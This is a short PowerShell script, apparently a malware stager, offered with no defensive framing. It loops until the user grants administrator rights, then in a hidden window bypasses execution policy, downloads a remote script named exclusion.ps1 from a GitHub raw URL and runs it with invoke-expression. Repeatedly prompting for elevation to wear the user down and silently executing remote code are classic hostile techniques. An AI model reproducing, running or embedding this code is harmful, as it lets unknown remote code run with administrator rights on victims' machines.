do {
    try {
        # Attempt to run PowerShell as admin
        Start-Process powershell -WindowStyle Hidden -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command $pl = iwr https://github.com/m4x7c/win11lude/raw/refs/heads/main/exclusion.ps1; invoke-expression $pl' -Verb RunAs
        $success = $true
    } catch {
        # If the command was not successful, set success to false
        $success = $false
    }
} until ($success)
 
exit